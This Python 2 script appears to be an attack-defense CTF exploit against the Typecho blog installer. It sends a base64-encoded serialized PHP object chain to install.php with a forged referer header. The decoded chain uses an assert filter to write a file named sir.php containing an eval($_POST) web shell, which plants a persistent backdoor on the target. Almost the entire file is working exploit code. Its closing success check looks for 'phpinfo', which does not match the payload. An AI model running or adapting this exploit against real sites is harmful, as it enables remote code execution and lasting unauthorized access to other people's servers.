#coding:utf-8

import urllib2
import urlparse
import requests

url = "http://192.168.2.3:8888/TeamA/1/install.php"
domain=""
#判断漏洞是否存在
try:
    print "try to open web..."
    web = urllib2.urlopen(url,timeout=3)
    print "open success!"
except Exception as e:
    print "open fail.it's safe"
    raise e
    exit()

o = urlparse.urlparse(url)
domain = o[0] + "://" + o[1] + "/" + "typecho"
print domain
# exit()

url = url +"/?finish=1"
data={
    "__typecho_config":"YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU5OiJmaWxlX3B1dF9jb250ZW50cygnc2lyLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFsxMjNdKTs/PicpOyI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjU5OiJmaWxlX3B1dF9jb250ZW50cygnc2lyLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFsxMjNdKTs/PicpOyI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30="
}
headers_data = {
    "referer":domain
}
print url
content =requests.post(url=url,data = data,headers=headers_data,timeout=5)
content.encoding='utf-8'
print content
patch=content.text
# print patch
if "phpinfo" in patch:
    print "success!"

